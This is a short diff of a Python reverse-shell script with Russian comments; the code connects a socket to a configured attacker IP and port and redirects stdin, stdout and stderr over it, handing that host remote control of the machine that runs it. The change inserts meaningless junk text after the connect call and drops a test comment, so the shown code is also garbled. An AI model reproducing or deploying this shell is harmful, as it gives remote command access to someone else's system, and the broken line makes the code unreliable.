@@ -8,7 +8,7 @@ PORT = 7777       # Замените на порт, который вы прос
 
 def reverse_shell(ip, port):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect((ip, port))
+    s.connect((ip, port))   ojkjlljklkljk
     os.dup2(s.fileno(), 0)  # Перенаправление stdin
     os.dup2(s.fileno(), 1)  # Перенаправление stdout
     os.dup2(s.fileno(), 2)  # Перенаправление stderr
@@ -16,4 +16,3 @@ def reverse_shell(ip, port):
 
 # Запуск функции
 reverse_shell(IP, PORT)
-# test test test
